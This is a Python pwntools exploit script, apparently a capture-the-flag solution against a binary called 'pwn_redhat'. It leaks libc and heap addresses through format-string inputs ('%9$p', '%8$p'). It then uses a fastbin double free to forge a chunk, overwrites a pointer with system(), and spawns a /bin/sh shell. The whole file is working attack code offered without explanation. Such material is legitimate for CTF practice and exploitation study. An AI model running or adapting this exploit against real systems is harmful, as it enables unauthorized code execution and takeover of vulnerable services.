from pwn import *

#p = remote('172.16.9.29',6799)
p = process('./pwn_redhat')
elf = ELF('./pwn_redhat')
#context.log_level = 'debug'

def ls():
	p.recvuntil('>>>')
	p.sendline('ls')

def touch(size,content):
	p.recvuntil('>>>')
	p.sendline('touch')
	p.recvuntil('Size:')
	p.sendline(str(size))
	p.recvuntil('content:')
	p.sendline(content)

def rm(index):
	p.recvuntil('>>>')
	p.sendline('rm')
	p.recvuntil('Index:')
	p.sendline(str(index))

def su(code):
	p.recvuntil('>>>')
	p.sendline('su')
	p.recvuntil('verify code:')
	p.sendline(code)

def ssh():
	p.recvuntil('>>>')
	p.sendline('sh')


p.recvuntil('>>>')
p.sendline('%9$p')
libc_start_main_ret = int(p.recvuntil(' :command',drop = 'True')[2:],16)
#log.success('libc start main ret : 0x%x'%libc_start_main_ret)
offset___libc_start_main_ret = 0x20830
libc_base = libc_start_main_ret - offset___libc_start_main_ret
log.success('libc base addr : 0x%x'%libc_base)
offset_system = 0x0000000000045390

p.recvuntil('>>>')
p.sendline('%8$p')
heap_base = int(p.recvuntil(' :command',drop = 'True')[2:],16) - 0x13c0
log.success('heap base addr : 0x%x'%heap_base)


touch(0x10,'aaaa') #0
touch(0x10,'bbbb') #1
touch(0x10,'cccc') #2

rm(0) # 0
rm(1) # 1 -> 0
rm(0) # 0 -> 1 -> 0

fake_chunk = heap_base + 0x202000 + 2 - 8
system_addr = libc_base + offset_system
touch(0x10,p64(fake_chunk))  # 1 -> 0
#gdb.attach(p)
touch(0x10,'eeee') # 0
touch(0x10,'/bin/sh\x00')
touch(0x10,'g'*(6 + 8) + p64(system_addr)*3)
#gdb.attach(p)
rm(0)
p.interactive()


